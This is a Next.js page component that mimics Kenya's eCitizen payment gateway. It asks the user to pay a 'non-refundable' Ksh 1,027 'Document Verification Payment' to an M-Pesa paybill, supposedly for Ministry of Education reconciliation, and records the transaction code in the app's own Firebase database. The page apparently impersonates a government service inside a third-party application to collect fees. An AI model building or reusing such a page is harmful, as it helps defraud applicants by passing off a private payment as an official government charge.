
'use client';

import React from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useFirebase } from '@/firebase';
import { doc } from 'firebase/firestore';
import { updateDocumentNonBlocking } from '@/firebase/non-blocking-updates';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Smartphone, Shield, Info, Loader2, AlertCircle } from 'lucide-react';

export default function ECitizenPage() {
  const { firestore, user } = useFirebase();
  const searchParams = useSearchParams();
  const router = useRouter();
  const appId = searchParams.get('appId');
  const [code, setCode] = React.useState('');
  const [loading, setLoading] = React.useState(false);
  const [error, setError] = React.useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!firestore || !user || !appId) return;
    if (code.length < 10) {
      setError('Please enter a valid M-Pesa Transaction Code.');
      return;
    }

    setLoading(true);
    const updateData = {
      status: 'ecitizen_paid',
      mpesaCode1027: code.toUpperCase()
    };

    const userRef = doc(firestore, 'users', user.uid, 'applications', appId);
    const globalRef = doc(firestore, 'global_applications', appId);

    updateDocumentNonBlocking(userRef, updateData);
    updateDocumentNonBlocking(globalRef, updateData);

    setTimeout(() => {
      router.push('/status');
    }, 1500);
  };

  return (
    <div className="bg-slate-100 min-h-screen py-12 px-4">
      <div className="max-w-md mx-auto space-y-6">
        <div className="flex items-center justify-center gap-2 mb-8">
          <div className="bg-primary p-2 rounded-lg">
            <Shield className="h-6 w-6 text-white" />
          </div>
          <span className="font-black text-2xl tracking-tighter text-[#0051B4]">e-Citizen</span>
          <span className="text-xs font-bold text-muted-foreground uppercase border-l pl-2 border-slate-300">Gateway</span>
        </div>

        <Card className="border-none shadow-2xl rounded-3xl overflow-hidden">
          <CardHeader className="bg-[#0051B4] text-white p-6">
            <CardTitle className="text-center text-lg font-bold">Document Verification Payment</CardTitle>
          </CardHeader>
          <CardContent className="p-8 space-y-6">
            <div className="space-y-2 text-center">
              <p className="text-[10px] text-muted-foreground uppercase font-black">Payable Amount</p>
              <h2 className="text-4xl font-black text-accent">Ksh 1,027.00</h2>
            </div>

            <div className="p-4 bg-blue-50 rounded-2xl border border-blue-100 space-y-4">
              <div className="flex justify-between items-center">
                <p className="text-[10px] uppercase font-bold text-blue-600">M-Pesa Paybill</p>
                <Smartphone className="h-4 w-4 text-blue-400" />
              </div>
              <div className="flex justify-between items-end">
                <div>
                  <p className="text-3xl font-black text-blue-900">222222</p>
                </div>
                <div className="text-right">
                  <p className="text-[10px] uppercase font-bold text-blue-600">Account Number</p>
                  <p className="font-bold text-blue-900 break-all text-xs">{appId?.slice(0, 8)}</p>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label className="text-[10px] font-black uppercase text-slate-500">M-Pesa Transaction Code</Label>
                <Input 
                  placeholder="e.g. QXA12BC34" 
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="h-12 font-mono uppercase border-2 focus:border-[#0051B4]"
                />
              </div>

              {error && (
                <div className="flex gap-2 text-xs text-red-600 bg-red-50 p-3 rounded-lg">
                  <AlertCircle className="h-4 w-4" />
                  <p>{error}</p>
                </div>
              )}

              <Button 
                type="submit" 
                disabled={loading}
                className="w-full h-14 bg-[#0051B4] hover:bg-[#003C84] font-bold uppercase"
              >
                {loading ? <Loader2 className="animate-spin" /> : 'Complete Verification'}
              </Button>
            </form>

            <div className="flex gap-2 items-start p-3 bg-slate-50 rounded-xl text-[10px] text-slate-500 italic">
              <Info className="h-3 w-3 shrink-0 mt-0.5" />
              <p>By proceeding, you agree to eCitizen terms. This fee is non-refundable and covers external document reconciliation with the Ministry of Education.</p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
